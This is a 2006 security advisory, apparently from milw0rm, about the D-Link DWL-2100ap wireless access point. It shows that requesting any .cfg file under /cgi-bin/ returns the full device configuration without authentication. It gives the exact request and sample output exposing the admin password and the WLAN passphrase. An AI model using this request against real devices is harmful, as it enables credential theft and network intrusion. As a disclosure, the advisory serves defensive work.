@@ -1,0 +1,34 @@
+# ADVISORY/0206 - D-Link Wireless Access-Point (DWL-2100ap)
+# INTRUDERS TIGER TEAM SECURITY - SECURITY ADVISORY
+# http://www.intruders.com.br/ , http://www.intruders.org.br/
+
+Making a HTTP request to the /cgi-bin/ directory, the Web server will return error 404 (Page not found).
+Making a HTTP request to the /cgi-bin/AnyFile.htm, the Web server will return error 404 (Page not found).
+However, making a HTTP request to any file in /cgi-bin/ directory, with .cfg extension, will return all the device configuration.
+
+For example, making the following request:
+
+http://dlink-DWL-2100ap/cgi-bin/Intruders.cfg
+We would have a result equivalent to the following:
+
+# Copyright (c) 2002 Atheros Communications, Inc., All Rights Reserved
+# DO NOT EDIT -- This configuration file is automatically generated
+magic Ar52xxAP
+fwc: 34
+login admin
+DHCPServer
+Eth_Acl
+nameaddr
+domainsuffix
+IP_Addr 10.0.0.30
+IP_Mask 255.0.0.0
+Gateway_Addr 10.0.0.1
+RADIUSaddr
+RADIUSport 1812
+RADIUSsecret
+password IntrudersTest
+passphrase
+wlan1 passphrase AnewBadPassPhrase
+# Several lines removed.
+
+# milw0rm.com [2006-06-08]
